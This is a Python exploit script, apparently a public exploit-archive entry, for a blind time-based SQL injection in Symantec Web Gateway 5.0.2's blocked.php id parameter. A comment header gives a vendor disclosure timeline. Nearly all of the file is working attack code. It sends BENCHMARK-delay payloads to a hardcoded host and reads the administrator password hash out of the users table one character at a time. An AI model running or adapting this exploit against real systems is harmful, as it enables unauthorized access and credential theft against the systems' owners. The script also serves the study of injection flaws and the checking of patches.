#!/usr/bin/python
 
######################################################################################
# Exploit Title: Symantec Web Gateway 5.0.2 (blocked.php id parameter) Blind SQL Injection
# Date: Jul 23 2012
# Author: muts
# Version: Symantec Web Gateway 5.0.2
# Vendor URL: http://www.symantec.com
#
# Timeline:
#
# 29 May 2012: Vulnerability reported to CERT
# 30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
# 26 Jun 2012: Email received from Symantec for additional information
# 26 Jun 2012: Additional proofs of concept sent to Symantec
# 06 Jul 2012: Update received from Symantec with intent to fix
# 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
# 23 Jul 2012: Public Disclosure
#
######################################################################################
 
import urllib
import time
import sys
from time import sleep
 
# Set your timing variable. A minimum value of 200 (2 seconds) was tested on localhost.
# This might need to be higher on production systems.
 
timing=300
 
def check_char(i,j,timing):
 
    url =   ("https://172.16.254.111/spywall/blocked.php?d=3&file=3&id=1)" +
        " or 1=(select IF(conv(mid((select password from users),%s,1),16,10) "+
        "= %s,BENCHMARK(%s,rand()),11) LIMIT 1&history=-2&u=3") % (j,i,timing)
    start=time.time()
    urllib.urlopen(url)
    end =time.time()
    howlong=int(end-start)
    return howlong
 
counter=0
startexploit=time.time()
print "[*] Symantec \"Wall of Spies\" hash extractor"
print "[*] Time Based SQL injection, please wait..."
sys.stdout.write("[*] Admin hash is : ")
sys.stdout.flush()
 
for m in range(1,33):
    for n in range(0,16):
        counter= counter+1
        output = check_char(n,m,timing)
        if output > ((timing/100)-1):
            byte =hex(n)[2:]
            sys.stdout.write(byte)
            sys.stdout.flush()
            break
endexploit=time.time()
totalrun=str(endexploit-startexploit)
print "\n[*] Total of %s queries in %s seconds" % (counter,totalrun)

